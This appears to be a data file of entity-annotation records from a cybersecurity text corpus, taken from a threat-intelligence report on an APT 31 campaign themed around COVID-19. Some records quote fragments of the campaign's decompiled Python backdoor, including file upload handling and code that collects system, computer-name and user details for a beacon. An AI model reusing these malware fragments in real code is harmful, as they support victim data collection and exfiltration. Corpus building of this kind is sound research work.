{"mention": "In this blog, we will share details of the attack flow, threat attribution, correlation between various instances of attacks by this threat actor, and an in-depth technical analysis of the payloads involved.", "context_left": "After further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the Chinese state-sponsored threat actor APT 31.", "context_right": "We will conclude our analysis by sharing indicators of compromise (IOCs), useful metadata, and the complete decompiled Python script, which was the main payload involved in these attacks.", "_context_left": "", "_context_right": "", "sentence_left": "After further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the Chinese state-sponsored threat actor APT 31.", "sentence_right": "We will conclude our analysis by sharing indicators of compromise (IOCs), useful metadata, and the complete decompiled Python script, which was the main payload involved in these attacks.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Sendmsg({u'cmd': u'upload', u'res': u'Upload file success ,saved to %s' % self.dest}, self.proxy, self.jobid)", "context_left": "fopen.close()", "context_right": "except Exception as e:", "_context_left": "", "_context_right": "", "sentence_left": "fopen.close()", "sentence_right": "except Exception as e:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "fopen.write(file\\_content)", "context_left": "fopen = open(self.dest, 'wb+')", "context_right": "fopen.close()", "_context_left": "", "_context_right": "", "sentence_left": "fopen = open(self.dest, 'wb+')", "sentence_right": "fopen.close()", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "else:", "context_left": "startbot(not isproxy)", "context_right": "flag = check\\_cred(server, [])", "_context_left": "", "_context_right": "", "sentence_left": "startbot(not isproxy)", "sentence_right": "flag = check\\_cred(server, [])", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "filename = (u'back#{}#{}#.txt').format(uniqueid, self.jobid)", "context_left": "filename = uniqueid", "context_right": "file\\_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'file': self.attachment, u'msg': self.text})", "_context_left": "", "_context_right": "", "sentence_left": "filename = uniqueid", "sentence_right": "file\\_content = json.dumps({u'sys': getSysinfo(), u'date': getdate(), u'pcname': getComputername(), u'user': getUser(), u'file': self.attachment, u'msg': self.text})", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}